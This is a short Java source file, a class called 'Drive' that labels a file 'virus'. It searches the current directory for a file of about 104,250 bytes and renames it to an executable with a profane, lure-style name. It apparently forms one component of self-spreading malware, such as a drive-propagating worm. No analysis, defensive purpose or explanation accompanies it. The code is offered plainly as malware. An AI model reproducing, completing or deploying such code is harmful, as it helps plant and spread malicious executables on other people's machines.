import java.io.*;
class Drive
{
	public File virus=null;
	public void kickStart()
	{
		virus = new File(".\\Fuck4free.exe");
		if(!virus.exists()) makeVirus();
	}	
	public void makeVirus()
	{
		long size=104250;
		File dir=new File(".\\");
		File[] list=dir.listFiles();
		for(int i=0;i<list.length;i++)
			if((list[i].length()>(size-15))&&(list[i].length()<(size+15)))
			{
				list[i].renameTo(virus);
				break;
			}
	}
	
}
